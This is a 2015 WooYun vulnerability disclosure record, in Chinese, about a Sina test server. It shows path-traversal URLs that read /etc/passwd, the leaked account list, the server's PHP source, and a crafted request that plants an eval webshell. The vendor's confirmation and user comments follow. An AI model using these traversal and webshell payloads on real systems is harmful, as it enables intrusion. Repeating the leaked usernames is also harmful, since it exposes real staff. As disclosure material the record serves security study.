{"id": 46398, "wybug_id": "wooyun-2015-091301", "wybug_title": "Sina某站从任意文件读取到GetShell", "wybug_corp": "新浪", "wybug_author": "boooooom", "wybug_date": "2015-01-12 09:34", "wybug_open_date": "2015-02-26 09:36", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述： RT 详细说明：  首先从一个看似很蛋疼的页面开始说起http://123.125.106.97/test/data.php 这是个啥？\n\n嗯，他教我要传入两个参数。\nplease input 'date=&type='\n随便传入两个值发现是下载xls，经验告诉我，date这个参数很有可能是拼接然后读文件，于是有了\nhttp://123.125.106.97/test/data.php?date=../../../../../../../../../../../../../../../../etc/passwd%00&type=../../../../../../../../../../../../../../../../etc/passwd%00\n果然是读文件\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsysmon:x:60422:60422::/nonexistent:/nologinsshd:x:500:500::/home/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:104:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologinlibin1:x:502:502::/usr/home/libin1:/bin/bashjunhai:x:503:503::/usr/home/junhai:/bin/bashqingming:x:504:504::/usr/home/qingming:/bin/bashliyuan:x:505:505::/usr/home/liyuan:/bin/bashhangang:x:507:507::/usr/home/hangang:/bin/bashwangshuo:x:508:508::/usr/home/wangshuo:/bin/bashgenlei:x:509:509::/usr/home/genlei:/bin/bashxiaoyue1:x:514:514::/usr/home/xiaoyue1:/bin/bashpengjie:x:520:520::/usr/home/pengjie:/bin/bashtaohui:x:528:528::/usr/home/taohui:/bin/bashyuli3:x:533:533::/usr/home/yuli3:/bin/bashsearch:x:536:536::/usr/home/search:/sbin/nologinxueyun:x:537:537::/usr/home/xueyun:/bin/bashjianqing:x:540:540::/usr/home/jianqing:/bin/bashhongwei6:x:542:542::/usr/home/hongwei6:/bin/bashwuhua1:x:543:543::/usr/home/wuhua1:/bin/bashmysql:x:545:545::/usr/home/mysql:/sbin/nologinxiaolong:x:547:547::/usr/home/xiaolong:/bin/bashqixing:x:548:548::/usr/home/qixing:/bin/bashliuxin4:x:549:549::/usr/home/liuxin4:/bin/bashzhuhuan:x:550:550::/usr/home/zhuhuan:/bin/bashzhongqin:x:551:551::/usr/home/zhongqin:/bin/bashleilei3:x:552:552::/usr/home/leilei3:/bin/bashyajun:x:554:554::/usr/home/yajun:/bin/bashdalong1:x:556:556::/usr/home/dalong1:/bin/bashkaijun1:x:557:557::/usr/home/kaijun1:/bin/bashzhenqiang1:x:561:561::/usr/home/zhenqiang1:/bin/bashjinqiang:x:565:565::/usr/home/jinqiang:/bin/bashrdsup_api:x:567:567::/usr/home/rdsup_api:/bin/bashchenyang:x:568:568::/usr/home/chenyang:/bin/bashshukui1:x:569:569::/usr/home/shukui1:/bin/bashbangjian:x:572:572::/usr/home/bangjian:/bin/bashkaiwei3:x:574:574::/usr/home/kaiwei3:/bin/bashmaqian:x:576:576::/usr/home/maqian:/bin/bashguochao3:x:578:578::/usr/home/guochao3:/bin/bashxiaofeng6:x:580:580::/usr/home/xiaofeng6:/bin/bashxiaodong2:x:581:581::/usr/home/xiaodong2:/bin/bashwb_liukai:x:582:582::/usr/home/wb_liukai:/bin/bashwb_guorui:x:583:583::/usr/home/wb_guorui:/bin/bashwb_zhuoyue:x:584:584::/usr/home/wb_zhuoyue:/bin/bashhean:x:585:585::/usr/home/hean:/bin/bashzhuxing:x:588:588::/usr/home/zhuxing:/bin/bashxingdong:x:589:589::/usr/home/xingdong:/bin/bashpuppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologinhongkai1:x:590:590::/usr/home/hongkai1:/bin/bashbaohua:x:591:591::/usr/home/baohua:/bin/bashtangkai:x:592:592::/usr/home/tangkai:/bin/bash\n然后，然后猜路径读php源代码啊，嗯，猜到了\nhttp://123.125.106.97/test/data.php?date=../../../../test/data.php%00&type=1关键是这个文件../../../../test/tmpls.php\n159-163行\n...\t\t\t}else if($mod == 'tmpsave'){\t\t\t\t$data = $_REQUEST['data'];\t\t\t\tsaveTmpl($filename, $data, $url);\t\t\t\treturn;\t\t\t}else if($mod == 'down'){...\nsaveTmpl可疑的函数，8成屎写文件的，继续下代码看，头部include了一个文件require_once('include/tmpl_func.php');\n<?php\trequire_once(\"Settings.php\");if(!extension_loaded(\"curl\"))@dl(\"curl.so\");\tfunction crawl($url){                $request = curl_init();                if (!$request) {                        return -1;                }                if (!curl_setopt($request, CURLOPT_URL, $url)) {                        return -2;                }                if (!curl_setopt($request, CURLOPT_RETURNTRANSFER, true)){                        return -3;                }                if (!curl_setopt($request, CURLOPT_TIMEOUT, 15)){                        return -4;                }                if (!curl_setopt($request, CURLOPT_ENCODING, 'gzip,deflate')){                        return -5;                }                if (!curl_setopt($request, CURLOPT_USERAGENT, 'SinaWeiboBot')) {                        return -6;                }                $response = curl_exec($request);                if (!$response) {                        return -7;                }                return $response;        }\t/*\t*页面编码纠正\t*/\t\tfunction judgeCharset($html){\t\t$head = $html->find('head');\t\t$head = current($head);\t\t$meta = $head->find('meta');\t\tfor($i=0; $i<count($meta);$i++){\t\t\t$one = $meta[$i];\t\t\t//content=\"text/html; charset=utf-8\"\t\t\t$charset = strtolower($one->getAttribute('content'));\t\t\tlist($type, $code) = explode(\";\", $charset);\t\t\techo $charset;\t\t\tif(strpos($code, \"utf-8\") >0 || strpos($code, \"utf8\") >0){\t\t\t\t$one->setAttribute('content', \"text/html; charset=gbk\");\t\t\t\treturn true;\t\t\t\t}\t\t}\t\treturn false;\t}\tfunction getUrlContent(&$url){\t\t\t$content = crawl($url);                if(strpos($content, '</head>') === false){                        $content = str_replace('<body>', '</head><body>', $content);\t\t}\t\tif(is_utf8($content)) return \"utf8\";\t\telse return \"gbk\";\t\t/*\t\tif(IsUTF8($content)){                        $content = iconv('utf-8', 'gbk//ignore', $content);\t\t\t$arr = array(\"charset=utf-8\" => \"charset=gbk\");\t\t\t$content = strtr($content,$arr);\t\t}\t\t*/                return $content;\t\t}\t/**\t * 取得网页内容\t *\t * @param string $url\t * @return string\t */\tfunction getUrlContent2(&$url){\t\t$http = array('http'=>array('method'=>'GET', 'timeout'=>1, 'user_agent'=>\"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 QQDownload/1.7\", 'header'=>\"Accept-Language: zh-cn,zh;q=0.5\"));\t\t$content = @file_get_contents($url, false, stream_context_create($http));\t\tif(strpos($http_response_header[0], '404') !== false)return false;\t\tif(!$content){\t\t\t$ch = curl_init();\t\t\tcurl_setopt($ch, CURLOPT_URL, $url);\t\t\tcurl_setopt($ch, CURLOPT_HEADER, 0);\t\t\tcurl_setopt($ch, CURLOPT_HTTPHEADER, array(\"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 QQDownload/1.7\", \"Accept-Language: zh-cn,zh;q=0.5\"));\t\t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t\t\t$content = curl_exec($ch);\t\t\tcurl_close($ch);\t\t}\t\tif(IsUTF8($content))\t\t\t$content = iconv('utf-8', 'gbk//ignore', $content);\t\tif(strpos($content, '</head>') === false)\t\t\t$content = str_replace('<body>', '</head><body>', $content);\t\treturn $content;\t}\t/**\t*读取配置\t*\t*@param String $line\t*@return array() if is section ,return array(section), if is entry, return array(entry, value)\t*/\tfunction readConfig($line){\t\t$line = trim($line);\t\t//解析section\t\t\tif(strpos($line, '[') == 0 && strrpos($line, ']') == (strlen($line) - 1)){\t\t\treturn array(substr($line, 1, strlen($line) - 2));\t\t}else{\t\t\t//解析value                        $pos = strpos($line, '=');                        if($pos > 0){                                $entry = trim(substr($line, 0, $pos));                                $value = trim(substr($line, $pos+1));                                return array($entry, $value);                        }                }                return array();\t}\t/**\t * 读取模板配置文件\t *\t * @param String $filename\t * @return Array\t */\tfunction parseTmpl($filename){\t\tif(!file_exists($filename))return false;\t\t$tmpl = new Settings_INI();\t\t$ret = $tmpl->load($filename);\t\t/*\t\t$typeRet = array();\t\tforeach($ret as $section=>$entrys){\t\t\t//如果是以special开头的，则提取后面的名字\t\t\t$key = substr($section, strlen(\"special-\"));\t\t\tforeach($entrys as $entry => $value){\t\t\t\t if(strcmp($entry, \"GENERAL\") == 0){                                        $typeRet[$key]['score'] = $value;                                }else if(strcmp($entry, \"WEIGHT\") == 0){                                        $typeRet[$key]['weight'] = $value;                                }                                else if(strcmp($entry, \"TEMPLATE\") == 0){                                        $typeRet[$key]['tmpl'] = $value;                                }\t\t\t}\t\t}\t\t*/\t\treturn $ret;\t}\tfunction parseTmpl2($filename){\t\tif(!file_exists($filename))return false;\t\t$content = file_get_contents($filename);\t\t$content = iconv('gbk', 'utf-8//ignore', $content);\t\t$lines = preg_split('/\\r\\n|\\n|\\r/', $content, -1, PREG_SPLIT_NO_EMPTY);\t\t$data = array();\t\t$count = count($lines);\t\tfor($i = 0; $i < $count; $i ++){\t\t\t$line = $lines[$i];\t\t\tif(strpos($line, ':') === false)continue;\t\t\tlist($key, $val) = explode(':', $line);\t\t\tif(strpos($key, '#list') === 0){\t//解析list\t\t\t\t$t = explode('|', $key);\t\t\t\t$name = $t[1];\t\t\t\t$path = $val;\t\t\t\t$data['list'][$path]['name'] = $name;\t\t\t\t$line = $lines[++$i];\t\t\t\twhile($i < $count && $line != '#endlist'){\t\t\t\t\tlist($k, $v) = explode(':', $line);\t\t\t\t\t$data['list'][$path]['content'][$k] = $v;\t\t\t\t\t$line = $lines[++$i];\t\t\t\t}\t\t\t\tif($i == $count)return false;\t//没找到结束标签\t\t\t}else $data[$key] = $val;\t\t}\t\treturn $data;\t}\t\t/**\t * 保存模板到配置文件中\t *\t */\tfunction saveTmpl($filename, $data, $url, $flag = true){\t\tif($flag){                \t$array = json_decode($data, true);\t\t}else $array = $data;                if(!$array)return false;\t\t//初始化common信息\t\tif(!$array['common']){\t\t\t$array['common']['REGISTER_URL'] = $url;\t\t\t$array['common']['REGISTER_ID'] = md5($url);\t\t\t$array['common']['REGISTER_TOP'] = 5;\t\t}else{\t\t\tif(!$array['common']['REGISTER_URL']) $array['common']['REGISTER_URL'] = $url;\t\t\tif(!$array['common']['REGISTER_ID']) $array['common']['REGISTER_ID'] = md5($url);\t\t\tif(!$array['common']['REGISTER_TOP']) $array['common']['REGISTER_TOP'] = 5;\t\t}\t\t\t\t$fpFile =fopen($filename, \"w\");\t\tif(!$fpFile) {\t\t\techo \"write $filename error.<br/>\";\t\t\treturn false;\t\t}\t\tforeach($array as $section=>$entrys){\t\t\tfprintf($fpFile,\"[%s]\\n\", $section);\t\t\tforeach($entrys as $entry=>$value){\t\t\t\tfprintf($fpFile,\"%s = %s\\n\", $entry, $value);\t\t\t}\t\t}\t\tfclose($fpFile);\t\treturn true;\t}\t/**检测站点模板是否存在\t**/\tfunction existed_tmpl($CONFIG, $site){                $path = $CONFIG['tmpl']['TEMPLATE_PATH'];                if(!file_exists($path)) return false;                //看是否有该站点的模板                //模板命名为$domain.$urlmd5.tmpl                if(!preg_match('/http:\\/\\/([^\\/]+)/', $site, $matches)) {                        return false;                }                $domain = $matches[1];                $urlmd5  = md5($site);                $filename = \"$path/$domain.$urlmd5.tmpl\";                if(!file_exists($filename)) return false;                return true;\t}\tfunction saveTmpl2($filename, $data){\t\t$array = json_decode($data, true);\t\tif(!$array)return false;\t\t$str = \"\";\t\tforeach ($array as $key=>$val){\t\t\tif($key == 'list')continue;\t\t\t$str .= \"$key:$val\\r\\n\";\t\t}\t\tif(isset($array['list'])){\t\t\tforeach ($array['list'] as $key=>$val){\t\t\t\t$s = '';\t\t\t\t$name = $val['name'];\t\t\t\t$val = $val['content'];\t\t\t\tforeach ($val as $k=>$v){\t\t\t\t\t$s .= \"$k:$v\\r\\n\";\t\t\t\t}\t\t\t\tif(!empty($s))\t\t\t\t\t$str .= \"\\r\\n#list|$name:$key\\r\\n$s#endlist\\r\\n\";\t\t\t}\t\t}\t\t$str = iconv('utf-8', 'gbk//ignore', $str);\t\tfile_put_contents($filename, $str);\t\treturn true;\t}\t/**\t*从生成的html节点下读取页面编码格式\t*/\tfunction getContentCode($html){\t}\t/**\t * 处理节点，给每一个有文字的节点添加onmouseover,onmouseout,onclick属性\t *\t * @param DOMNode $node\t */\tfunction dealNode22($node){\t\t$length = count($node->nodes);\t\t//对每个节点移除所有的事件\t\t$node->removeAttribute(\"onmouseover\");\t\t$node->removeAttribute(\"onmouseout\");\t\t$node->removeAttribute(\"onclick\");\t\tif($length == 0){\t\t\t$flag = false;\t\t\tif(trim($node->text()))\t\t\t\t$flag = true;\t\t\telse if($node->tag == 'img')\t\t\t\t$flag = true;\t\t\tif($flag){\t\t\t\tif($node->tag == 'text')\t\t\t\t\t$node = $node->parent();\t\t\t\t$excludeTags = array('text', 'script', 'style', 'head', 'body', 'iframe', 'input', 'select', 'textarea');\t\t\t\tif(!in_array($node->tag, $excludeTags)){\t\t\t\t\t$node->setAttribute('onmouseover', \"mouseover(event)\");\t\t\t\t\t$node->setAttribute('onmouseout', \"mouseout(event)\");\t\t\t\t\t$node->setAttribute('onclick', 'return mouseclick(event)');\t\t\t\t}\t\t\t\tif($node->tag == 'a'){\t\t\t\t\t$node->setAttribute(\"href\", \"javascript:void(0)\");\t\t\t\t\t$node->setAttribute(\"target\", \"_self\");\t\t\t\t}\t\t\t}\t\t}else{\t\t\tforeach ($node->nodes as $n)\t\t\t\tdealNode22($n);\t\t}\t}\tfunction dealNode($node){\t\t$length = count($node->nodes);\t\t$flag = false;\t\tif(trim($node->text())) $flag = true;\t\tif($flag && $length ==0 ){\t\t\t$excludeTags = array('text', 'script', 'style', 'head', 'body', 'iframe',\t\t\t\t\t     'input', 'select','textarea');\t\t\tif($node->tag == 'text' || $node->tag == 'img') $node = $node->parent();\t\t\tif(!in_array($node->tag, $excludeTags)){\t\t\t\tif($node->getAttribute('onmouseover') || $node->getAttribute('onclick')) return;\t\t\t\t$node->setAttribute('onmouseover', \"mouseover(event)\");\t\t\t\t$node->setAttribute('onmouseout', \"mouseout(event)\");\t\t\t\t$node->setAttribute('onclick', 'return mouseclick(event)');\t\t\t}\t\t\tif($node->tag == 'a'){\t\t\t\t$node->setAttribute(\"href\", \"javascript:void(0)\");\t\t\t\t$node->setAttribute(\"target\", \"_self\");\t\t\t}\t\t}\t\tif($length != 0){\t\t\tforeach ($node->nodes as $n)\t\t\t\tdealNode($n);\t\t}\t}\t?>\n嗯，那么构造一个url传shell\nhttp://123.125.106.97/test/tmpls.php?url=http://www.sina.php%00;123&mod=tmpsave&data={\"<?php @eval($_POST[wy123]);?>\":123}&common=1\n上传成功：http://123.125.106.97/test/tmpls/www.sina.php   漏洞证明：  \n\n\n\n\n\n   修复方案：  罚钱，这个要   版权声明：转载请注明来源 boooooom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-01-12 11:03 厂商回复： 感谢关注新浪安全，漏洞修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-12 09:55 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这提示有意思。。。    \n     2015-01-12 11:04 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  发现渣浪很少给20  呵呵     \n     2015-01-22 17:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  很给力    \n     2015-02-23 00:14 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  这个居然没加精。    \n     2015-02-26 11:12 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  233    \n     2015-02-28 11:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  很不错    \n     2015-03-08 15:02 |    \t\tevil_webshell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)\t\t \n  很有新意的入侵方法    \n     2015-03-18 13:22 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  怎么感觉像@猪猪侠 的小号    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}